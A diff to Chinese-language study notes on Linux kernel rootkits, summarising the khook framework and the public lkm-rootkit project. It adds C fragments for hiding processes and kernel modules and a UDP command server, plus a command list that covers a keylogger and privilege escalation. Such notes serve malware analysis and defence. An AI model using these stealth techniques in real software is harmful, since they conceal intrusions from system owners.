@@ -553,8 +553,6 @@ MODULE_LICENSE("GPL");
 
 30 秒前，会将 /sys/module下面对应模块的目录隐藏掉
 
-
-
 # khook
 
 一个内核函数hook框架
@@ -711,9 +709,126 @@ hook kill 函数，
           ................
 ```
 
+### 进程隐藏
+
+```c
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
+    struct hlist_node *link;
+#else
+    struct pid_link *link;
+#endif
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
+    link = &node->task->pid_links[PIDTYPE_PID];
+#else
+    link = &node->task->pids[PIDTYPE_PID];
+#endif
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,18,0)
+    hlist_del(link);
+#else
+    hlist_del(&link->node);
+#endif
+```
+
+恢复隐藏：
+
+```c
+attach_pid(task, PIDTYPE_PID);
+```
+
+在 Linux 内核中，attach_pid 是一个与进程管理相关的函数。它的主要作用是将一个进程的 pid 结构体附加到指定的 PID 类型（例如，PIDTYPE_PID、PIDTYPE_TGID、PIDTYPE_PGID 或 PIDTYPE_SID）和 PID 哈希链中。这个过程涉及将一个进程与特定类型的 PID 关联起来，从而支持进程的各种管理操作，如查找、信号发送等。
 
 
 
+### 学到的姿势
+
+内核读写文件：filp_open --> kernel_write / kernel_read --> filp_close
+
+
+# lkm-rootkit
+
+### hook 方式
+
+hook syscall_table
+
+### 会启动 udp server 与 用户空间进行交互
+
+```c
+sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &kthread->sock);
+
+memset(&kthread->addr, 0, sizeof(struct sockaddr));
+kthread->addr.sin_family = AF_INET;
+kthread->addr.sin_addr.s_addr = htonl(INADDR_ANY);
+kthread->addr.sin_port = htons(UDP_PORT);
+
+kthread->sock->ops->bind(kthread->sock, (struct sockaddr *)&kthread->addr, sizeof(struct sockaddr));
+
+size = sock_recvmsg(sock, &msghdr, msghdr.msg_flags);
+```
+
+支持的命令：
+
+```c
+#define CMD_HIDE_MODULE "hidemod"
+#define CMD_SHOW_MODULE "showmod"
+#define CMD_UNLOAD_MODULE "unloadmod"
+
+#define CMD_HIDE_FILE "hidefile"
+#define CMD_SHOW_FILE "showfile"
+
+#define CMD_HIDE_PROCESS "hideproc"
+#define CMD_SHOW_PROCESS "showproc"
+#define CMD_POP_PROCESS "popproc"
+
+#define CMD_HIDE_SOCKET "hidesocket"
+#define CMD_SHOW_SOCKET "showsocket"
+
+#define CMD_HIDE_PACKET "hidepacket"
+#define CMD_SHOW_PACKET "showpacket"
+
+#define CMD_HIDE_PORT "hideport"
+#define CMD_SHOW_PORT "showport"
+
+#define CMD_INIT_KEYLOGGER "keylog"
+#define CMD_EXIT_KEYLOGGER "keyunlog"
+
+#define CMD_PROC_ESCALATE "escalate"
+#define CMD_PROC_DEESCALATE "deescalate"
+```
+
+具体的函数：cmd_run();
+
+### 模块隐藏
+
+这rootkit的话，做的比较好：
+
+会从module list中断链，也会从红黑树中删除自己
+
+hide_module:
+
+```c
+struct kernfs_node *node = mod->mkobj.kobj.sd;
+
+/* remove module from module list */
+list_del(&mod->list);
+
+/* remove module from rbtree */ //remove from /sys/module
+rb_erase(&node->rb, &node->parent->dir.children);
+node->rb.__rb_parent_color = (unsigned long)(&node->rb);
+```
+
+unhide_module:
+
+```c
+if(mod == THIS_MODULE)
+	list_add(&mod->list, head);
+else
+	list_add_tail(&mod->list, head);
+
+/* add module back in rbtree */
+rb_add(mod->mkobj.kobj.sd);
+```
 
 # 资料
 
@@ -744,3 +859,7 @@ https://github.com/milabs/khook?tab=readme-ov-file
 KoviD
 
 https://github.com/carloslack/KoviD
+
+lkm-rootkit
+
+https://github.com/croemheld/lkm-rootkit
